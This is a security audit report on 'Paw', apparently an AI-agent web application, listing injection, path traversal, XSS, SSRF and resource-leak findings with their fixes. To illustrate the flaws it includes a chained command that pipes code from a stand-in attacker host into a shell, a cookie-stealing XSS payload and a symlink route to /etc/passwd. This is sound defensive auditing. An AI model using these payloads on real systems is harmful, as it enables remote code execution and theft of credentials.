# Paw — Security & Code Quality Audit Report

**Date:** 2026-02-18
**Updated:** 2026-02-18 (Critical + High findings fixed)
**Scope:** Full codebase (`src/`, `plugins/`, `tests/`, `bin/`)
**Runtime:** Bun + Hono + SQLite

---

## Executive Summary

Paw has strong foundational practices — parameterized SQL queries, Argon2 password hashing, Zod config validation, and a plugin sandbox model. However, the audit uncovered **3 Critical**, **6 High**, **10 Medium**, and **3 Low** severity issues spanning command injection, path traversal, resource leaks, and memory management. The most urgent findings involve shell command injection in tool execution, arbitrary command execution via MCP server registration, and unbounded in-memory growth.

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 6 |
| Medium | 10 |
| Low | 3 |

---

## Critical Findings

### C1. Shell Command Injection in exec-tools
**File:** `src/tools/exec-tools.ts:25-44`
**Category:** Injection

```typescript
const baseCmd = command.split(/\s+/)[0];
// allowlist only checks first word
const proc = Bun.spawn(["sh", "-c", command], { ... });
```

The allowlist validates only the first whitespace-delimited token. An AI (or compromised provider) can chain commands: `ls; curl attacker.com/payload | sh`. The entire string is passed to `sh -c`, giving full shell interpretation.

**Fix:** Replace `sh -c` with `Bun.spawn([cmd, ...args])` using an argv array. Parse and validate each argument independently. Consider running tools with reduced OS privileges.

---

### C2. Arbitrary Command Execution via MCP Server Registration
**File:** `src/mcp/client-manager.ts:73-76`, `src/web/app.ts:920-923`
**Category:** Injection / Privilege Escalation

```typescript
// client-manager.ts — no validation
transport = new StdioClientTransport({
  command: config.command,
  args: config.args ?? [],
});

// app.ts — user input flows directly in
if (command.trim()) serverConfig.command = command.trim();
if (args.trim()) serverConfig.args = args.trim().split(/\s+/);
```

Any authenticated user can register an MCP server with `command: "bash"`, `args: ["-c", "malicious payload"]` via `POST /api/mcp/servers`. No command allowlisting, no path validation, no sandboxing.

**Fix:** Require absolute paths, validate against an allowlist of approved binaries, or restrict MCP registration to config-file-only (no web API).

---

### C3. canvasEvents Map — Unbounded Memory Growth
**File:** `src/web/app.ts:327-341`
**Category:** Memory Leak

```typescript
const canvasEvents = new Map<string, Array<{...}>>();
// Sessions created on every /canvas page load (line 371)
// Never garbage-collected from the Map
```

Each `/canvas` page visit creates a `canvas-<uuid>` key. Individual event arrays are trimmed, but the Map itself never evicts abandoned sessions. A long-running server accumulates thousands of empty arrays.

**Fix:** Add a periodic cleanup (e.g., every 5 minutes) that removes sessions with no activity for 1+ hour. Or use a WeakRef-based approach.

---

## High Findings

### H1. Path Traversal via Symlinks
**File:** `src/tools/file-tools.ts:11-20`, `src/tools/canvas-tools.ts`, `src/web/app.ts:469-475`
**Category:** Path Traversal

```typescript
function isWithinWorkspace(filePath: string, workspace: string): boolean {
  const resolved = resolve(workspace, filePath);
  const rel = relative(workspace, resolved);
  return !rel.startsWith("..") && !resolve(resolved).includes("\0");
}
```

The check uses `resolve()` + `relative()` but never follows symlinks. An attacker can create a symlink inside the workspace pointing to `/etc/passwd` and read it through `file_read` or `canvas_read`. The same pattern is used in the canvas preview route.

**Fix:** Call `fs.realpathSync()` on the resolved path and verify the real path is still within the workspace boundary.

---

### H2. XSS in Memory Page onclick Handler
**File:** `src/web/views/memory-page.tsx:106`
**Category:** Cross-Site Scripting

```typescript
onclick={`deleteMemory('${mem.id}')`}
```

`mem.id` is database content interpolated directly into an onclick attribute without escaping. A crafted memory ID like `'); alert(document.cookie);//` executes arbitrary JavaScript.

**Fix:** Use `encodeURIComponent(mem.id)` or switch to data attributes with event delegation.

---

### H3. Event Listener Leak in Chat Endpoint
**File:** `src/web/app.ts:833-850`
**Category:** Resource Leak

```typescript
const handler = (outbound) => {
  if (outbound.sessionId === sessionId) {
    kernel.eventBus.off("message:outbound", handler); // only removed on match
  }
};
kernel.eventBus.on("message:outbound", handler);
```

If the response timeout fires (120s) and the handler never matched, the listener stays registered on the event bus forever. Over time, stale handlers accumulate.

**Fix:** Remove the handler in the timeout rejection path as well:
```typescript
const timeout = setTimeout(() => {
  kernel.eventBus.off("message:outbound", handler);
  reject(new Error("Response timeout"));
}, 120_000);
```

---

### H4. fs.watch() Watcher Never Closed
**File:** `src/web/app.ts:355-361`
**Category:** Resource Leak

```typescript
watch(canvasRoot, { recursive: true }, (_evt, filename) => {
  if (filename) pushFileChanged(String(filename));
});
// Return value discarded — watcher leaks forever
```

The `FSWatcher` is never stored or closed. On process shutdown or hot-reload, it keeps the process alive and leaks file descriptors.

**Fix:** Store the watcher and close it in a cleanup/shutdown handler.

---

### H5. System Prompt Content Leaked to Logs
**File:** `src/kernel/kernel.ts:371-376`
**Category:** Information Disclosure

```typescript
this.logger.info("System prompt built", {
  promptPreview: systemPrompt.substring(0, 150),
});
```

The first 150 characters of every system prompt are logged. This may include injected memory content, user-specific instructions, or sensitive context.

**Fix:** Remove `promptPreview` from logs or replace with a hash/length-only metric.

---

### H6. Inconsistent Provider Error Handling — No Retry for OpenAI/Gemini/Ollama
**Files:** `src/ai/openai-provider.ts`, `src/ai/gemini-provider.ts`, `src/ai/ollama-provider.ts`
**Category:** Reliability

Only the Claude provider (`src/ai/provider.ts`) implements retry logic with exponential backoff. All other providers fail immediately on transient HTTP errors (429, 502, 503).

**Fix:** Extract retry logic into a shared utility and apply it to all providers.

---

## Medium Findings

### M1. CSRF Origin Validation Accepts Any Non-Empty Origin
**File:** `src/web/app.ts:66-77`

```typescript
return csrf({ origin: (origin) => origin !== "" })(c, next);
```

This allows requests from *any* origin as long as the Origin header is present. Should validate against the configured host.

---

### M2. SSRF via MCP SSE/HTTP Transport
**File:** `src/mcp/client-manager.ts:78-90`

User-supplied URLs for SSE/HTTP MCP transports are passed to the SDK without blocking private IP ranges (127.0.0.1, 169.254.169.254, 10.x.x.x, 192.168.x.x). Enables internal service enumeration and cloud metadata access.

---

### M3. No Rate Limiting on TOTP Attempts
**File:** `src/security/totp.ts:72`, `src/security/web-auth.ts:186`

TOTP verification has no per-account attempt throttling. The 90-second validity window (window=1) combined with only 10^6 possible codes makes brute-force feasible without rate limiting.

---

### M4. Rate Limiter Bypassed via IP Spoofing
**File:** `src/security/rate-limiter.ts`, `src/web/app.ts:96`

```typescript
const ip = c.req.header("x-forwarded-for") ?? c.req.header("x-real-ip") ?? "unknown";
```

Trusts `X-Forwarded-For` unconditionally. Without a trusted proxy configuration, attackers rotate IPs trivially.

---

### M5. Canvas CSP Too Permissive
**File:** `src/web/middleware/security-headers.ts:16-18`

Canvas preview allows `unsafe-inline`, `unsafe-eval`, and `img-src *`. The wildcard `img-src` enables data exfiltration via image requests to attacker-controlled servers. Consider adding `sandbox="allow-scripts"` to the iframe element.

---

### M6. Silent Error Swallowing in Canvas Chat
**File:** `src/web/app.ts:419`

```typescript
}).catch(() => {});  // All canvas chat errors silently discarded
```

Users get no feedback when canvas message processing fails.

---

### M7. N+1 Query in Memory Recall
**File:** `src/memory/store.ts:139-159`

After finding top vector/FTS results, each memory is fetched individually in a loop. Should use a single `WHERE id IN (...)` query.

---

### M8. FTS5 Injection Risk
**File:** `src/memory/store.ts:102`

```typescript
.all(query.replace(/['"]/g, ""), limit * 2);
```

Manual quote stripping is insufficient for FTS5 special syntax (`AND`, `OR`, `NOT`, `NEAR`, `*`). Malformed queries can cause errors or unexpected results.

---

### M9. canvasEventSeq Counter Not Atomic
**File:** `src/web/app.ts:328`

`++canvasEventSeq` is safe in Bun's single-threaded model today, but the pattern is fragile if workers are ever introduced. More importantly, concurrent `pushCanvasEvent` calls from `fs.watch` and `eventBus` listeners could interleave.

---

### M10. Health Endpoint Exposes Internal Details Without Auth
**File:** `src/web/middleware/auth.ts:5`

`/api/health` is in `PUBLIC_ROUTES`, returning provider type, plugin names, MCP server names, and connection status to unauthenticated users.

---

## Low Findings

### L1. Vector Deletion Silently Fails
**File:** `src/memory/store.ts:168`

```typescript
try { this.db.run("DELETE FROM memories_vec WHERE memory_id = ?", [memoryId]); } catch {}
```

Empty catch leaves orphaned vector entries when deletion fails.

---

### L2. Config File Read on Every Request
**File:** `src/web/app.ts:261`

`liveConfig()` calls `readConfigOverrides()` (disk I/O) on every page load. Should cache with file-watch invalidation.

---

### L3. Unsafe `any` Casts Throughout Codebase
**Files:** `src/ai/provider.ts:163`, `src/web/app.ts:867`, `src/cron/scheduler.ts:777`, `src/mcp/client-manager.ts:148`, `src/kernel/kernel.ts:223`, `src/memory/embeddings.ts:1`

Six instances of `as any` bypass TypeScript safety. Each is a potential runtime type error.

---

## Fix Status

All **Critical** and **High** findings have been fixed:

| ID | Status | Fix Summary |
|----|--------|-------------|
| C1 | FIXED | Replaced `sh -c` with argv-based `Bun.spawn(argv)`. Added shell metacharacter rejection, proper quote parsing, and cwd validation. |
| C2 | FIXED | Added command allowlist (`npx`, `node`, `bun`, etc.) and SSRF prevention (blocks private IP ranges) in `client-manager.ts`. |
| C3 | FIXED | Added periodic session cleanup (every 5 min, 1-hour TTL) with `canvasSessionLastAccess` tracking. |
| H1 | FIXED | Added `realpathSync()` symlink resolution to `file-tools.ts`, `canvas-tools.ts`, and canvas preview route in `app.ts`. |
| H2 | FIXED | Replaced string interpolation in onclick with `data-memory-id` attribute + `this.dataset.memoryId`. |
| H3 | FIXED | Added `eventBus.off()` in the timeout rejection path to prevent listener leaks. |
| H4 | FIXED | Stored `FSWatcher` reference and exposed `__cleanup()` function called by kernel shutdown. |
| H5 | FIXED | Removed `promptPreview` from kernel logs and Ollama provider logs. |
| H6 | FIXED | Created shared `src/ai/retry.ts` with exponential backoff. Applied to all 4 providers (Claude, OpenAI, Gemini, Ollama). |

## Remaining Recommendations (Medium/Low)

### Medium Priority
1. **M1** — Fix CSRF origin validation to check configured host
2. **M3** — Add TOTP attempt throttling (lockout after 5 failures)
3. **M4** — Only trust X-Forwarded-For behind configured proxy
4. **M5** — Add `sandbox` attribute to canvas iframe
5. **M6** — Log canvas chat errors instead of swallowing
6. **M7** — Batch memory recall into single IN query
7. **M8** — Use proper FTS5 query escaping
8. **M9** — Consider atomic event sequence (minor, safe in single-threaded Bun)
9. **M10** — Restrict /api/health to authenticated users or return minimal info

### Low Priority
10. **L1** — Fix vector deletion empty catch block
11. **L2** — Cache config reads with file-watch invalidation
12. **L3** — Remove `any` type casts throughout codebase
